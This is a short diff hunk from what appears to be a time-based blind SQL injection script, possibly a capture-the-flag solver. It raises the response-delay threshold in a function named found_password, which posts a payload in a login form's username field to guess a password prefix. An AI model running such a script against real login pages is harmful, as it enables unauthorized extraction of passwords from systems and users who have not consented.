@@ -21,7 +21,7 @@ def found_password(prefix: str) -> bool:
     resp = session.post(URL, data={"username": payload}, timeout=10)
     dt = time.perf_counter() - t0
     print("dt=", dt)
-    if dt >= 0.5:
+    if dt >= 1:
         print("[^] Time Delay signal", dt, prefix)
         return True
 
